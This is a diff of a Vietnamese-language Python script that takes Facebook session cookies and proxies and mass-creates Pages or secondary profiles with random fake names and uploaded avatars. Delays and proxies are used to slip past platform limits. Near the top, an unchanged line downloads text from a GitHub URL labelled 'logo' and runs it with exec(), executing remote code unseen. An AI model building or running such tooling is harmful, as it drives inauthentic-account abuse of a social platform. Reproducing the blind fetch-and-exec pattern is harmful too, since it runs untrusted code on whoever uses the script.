@@ -8,8 +8,6 @@ from datetime import datetime
 from time import sleep,strftime
 import requests
 exec(requests.get('https://raw.githubusercontent.com/Thuanvuse/filecode/main/logo').text)
-
-
 sopagemountao=int(input('[T]> Số Page Muốn Tạo Trên Mỗi FB : '))
 def Reg(cookies,fb_dtsg,name,proxy):
 	if proxy.count(":") == 3:
@@ -114,48 +112,53 @@ def UpAVT(cookiesFB,fb_dtsgFB,idpro5):
 	sleep(5)
 	response = requests.post('https://www.facebook.com/api/graphql/', headers=fheaders, data=datas) 
 	print("Up Ảnh Thành Công                           ",end='\r')
-	print(dem,f'> Thành Công ID: {idpro5}')
+	print(dem,f'> Thành Công ID: {idpro5} Đã Up Ảnh Cho Em Trai')
 ListALL=[]
-stt=0
+stt=1
 while True:
-	stt+=1
-	cookiesFB=input(f"Điền Cookie FB Cần Reg {stt} :")
+	cookiesFB=input(f"[+] > Điền Cookie FB Cần Reg {stt} :")
 	if len(cookiesFB) > 10 :
-		proxy=input(f"Proxy {stt} : ")
-		print("ĐANG KIỂM TRA COOKIE ......",end='\r')
-		headers = {
-			'authority': 'www.facebook.com',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-language': 'vi',
-			'cookie': cookiesFB,
-			'sec-ch-prefers-color-scheme': 'light',
-			'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-			'sec-ch-ua-mobile': '?0',
-			'sec-ch-ua-platform': '"Windows"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
-			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-			'viewport-width': '1366',
-		}
-		url_profile = requests.get('https://www.facebook.com/me', headers=headers).url
-		profile = requests.get(url_profile, headers=headers).text
 		try:
-			fb_dtsgFB = profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
+			proxy=input(f"[-] > Proxy {stt} : ")
+			print("[Check] > ĐANG KIỂM TRA COOKIE ......        ",end='\r')
+			headers = {
+				'authority': 'www.facebook.com',
+				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+				'accept-language': 'vi',
+				'cookie': cookiesFB,
+				'sec-ch-prefers-color-scheme': 'light',
+				'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+				'sec-ch-ua-mobile': '?0',
+				'sec-ch-ua-platform': '"Windows"',
+				'sec-fetch-dest': 'document',
+				'sec-fetch-mode': 'navigate',
+				'sec-fetch-site': 'none',
+				'sec-fetch-user': '?1',
+				'upgrade-insecure-requests': '1',
+				'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+				'viewport-width': '1366',
+			}
+			url_profile = requests.get('https://www.facebook.com/me', headers=headers).url
+			profile = requests.get(url_profile, headers=headers).text
+			try:
+				fb_dtsgFB = profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
+			except:
+				fb_dtsgFB = profile.split(',"f":"')[1].split('","l":null}')[0]
+			AE=f'{fb_dtsgFB}|{cookiesFB}|{proxy}'
+			ListALL.append(AE)
+			print("[T] > Thêm Thành Công Thành Công ! ")
+			stt+=1  
 		except:
-			fb_dtsgFB = profile.split(',"f":"')[1].split('","l":null}')[0]
-		AE=f'{fb_dtsgFB}|{cookiesFB}|{proxy}'
-		ListALL.append(AE)
-		print("Thành Công ! ")
+			print("[T] > Cookie Die Hoặc Proxy Có Vấn Đề ! Hãy Nhập Lại ")
+
 	else:
 		break
 
 dem = 0
-print('                                               ',end='\r')
+print('                                                                ',end='\r')
 
-dl = int(input("Điền Delay :"))
+
+dl = int(input("[T] > Điền Delay : "))
 def delay(dl):
    t=datetime.now().strftime("%H:%M")
    for ti in range(int(dl) , 0, -1):
@@ -166,7 +169,10 @@ mylist = ["101706786252767", "117567931316862", "101613956262598"]
 sttchay=0
 for Text in ListALL:
 	sttchay+=1
-	print(f"Bắt Đầu Reg Acc {sttchay}")
+	print('------------------------------------------------------------------')
+	print(f"[T] > Bắt Đầu Reg Cookie {sttchay}")
+	print('------------------------------------------------------------------')
+
 
 	proxy=Text.split("|")[2]
 	cookiesFB=Text.split("|")[1]
@@ -174,7 +180,7 @@ for Text in ListALL:
 	for i in range(sopagemountao):
 		try:
 			IDANH=random.choice(mylist)
-			arraylot = ["Công", "Đức", "Duy", "Gia", "Anh", "Hồng", "Đinh", "Quốc", "Quỳnh","Vĩnh"]
+			arraylot = ["Hưng","Anh", "Văn", "Tuấn", "Hoàng", "Quốc", "Năm", "Giang", "Khang", "Dương", "Phúc", "Thiên", "Hùng", "Kiệt", "Châu", "Quỳnh", "huệ", "Tuấn", "Khánh", "Trân", "Yên", "Lợi", "Danh", "Vinh", "Nhi", "Nhí", "Quốc", "Anh", "Danh", "Hân", "Giang","Phán","Hồng", "Đinh", "Quốc", "Quỳnh","Vĩnh"]
 			arraylot1 = ["Công", "Đức", "Duy", "Gia", "Anh", "Hồng", "Đinh", "Quốc", "Quỳnh","Vĩnh"]
 			arraylot2 = ["Công", "Đức", "Duy", "Gia", "Anh", "Hồng", "Đinh", "Quốc", "Quỳnh","Vĩnh"]
 			arrayten = ["Hưng","Anh", "Văn", "Tuấn", "Hoàng", "Quốc", "Năm", "Giang", "Khang", "Dương", "Phúc", "Thiên", "Hùng", "Kiệt", "Châu", "Quỳnh", "huệ", "Tuấn", "Khánh", "Trân", "Yên", "Lợi", "Danh", "Vinh", "Nhi", "Nhí", "Quốc", "Anh", "Danh", "Hân", "Giang","Phán"]
@@ -189,7 +195,7 @@ for Text in ListALL:
 			idpro5=cookiesPro5.split('i_user=')[1].split(";")[0]
 			UpAVT(cookiesFB,fb_dtsgFB,idpro5)
 		except:
-			print(f"Acc {sttchay} Bị Chặn Tạo Pro5")
+			print(f"[T] > Acc {sttchay} Bị Chặn Tạo Pro5")
 			break
 		delay(dl);
 quit()
